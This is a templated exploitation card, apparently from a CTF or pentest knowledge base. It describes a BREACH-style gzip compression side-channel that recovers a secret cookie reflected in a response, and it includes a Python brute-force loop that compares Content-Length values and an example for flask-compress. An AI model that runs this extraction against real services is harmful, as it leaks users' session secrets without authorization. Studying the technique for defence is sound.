---
name: breach_gzip_compression_side_channel
vuln_type: information_disclosure
sub_technique: compression_side_channel
category: exploitation
safety_level: safe
---

# Breach Gzip Compression Side-Channel For Secret Extraction

## When to Apply

Server response is gzip compressed, and the same response contains both (1) a secret value (cookie, etc.) and (2) attacker-controlled text. When the guessed characters match the secret's prefix, gzip compresses more efficiently → smaller Content-Length → character-by-character brute-force possible.

## Prerequisites

- Response has gzip/deflate compression (flask-compress, nginx gzip, etc.)
- Secret (cookie value, etc.) is reflected in the response
- Attacker can insert arbitrary text into the same response
- Oracle exists to observe Content-Length (debug mode, timing, etc.)

## Steps

1. Identify endpoint where secret is included in response (e.g. cookies reflected at /search)
2. Insert guess string into same response — e.g. pass 'cookies.*' + '<p id=key>token{s' in query
3. Compare Content-Length after gzip compression:
   - Correct prefix: '<p id=key>token{s' overlaps with actual '<p id=key>token{s3cr3t...' → smaller CL
   - Wrong prefix: '<p id=key>token{x' has no overlap → larger CL
4. Δ(Content-Length) is typically 1-3 bytes difference, identifiable
5. Expand compression context with padding (\x01 * N) to improve oracle accuracy
6. Iterate through alphabet extracting one character at a time, appending to extracted prefix

## Code Template

```
import requests

pad = '\x01' * 1000
extracted = ''
charset = 'abcdefghijklmnopqrstuvwxyz0123456789_{}!@'

for pos in range(32):
    best_char, best_cl = None, float('inf')
    for c in charset:
        prefix = extracted + c
        query = {{
            'cookies': '*',
            f'cookies.{{pad}}<p id=key>{{prefix}}': '*',
        }}
        resp = requests.post('{frontend_url}/search',
            json={{'query': query}},
            cookies={{'key': secret_cookie}})
        cl = int(resp.headers['Content-Length'])
        if cl < best_cl:
            best_cl = cl; best_char = c
    extracted += best_char
```

## Examples

### Example 1

- **compression**: flask-compress gzip (COMPRESS_MIN_SIZE=500)
- **secret_location**: req.cookies.key reflected via /search
- **oracle**: Content-Length header via debug mode + MessageChannel
- **padding**: \x01 * 1000
- **delta**: 2 bytes per correct character

Flask-compress default minimum size is 500 bytes — response must be large enough for gzip. Query user data together to exceed threshold. Use debug mode (window.debug.param='Content-Length') to receive fetch response header via MessageChannel to construct the oracle.
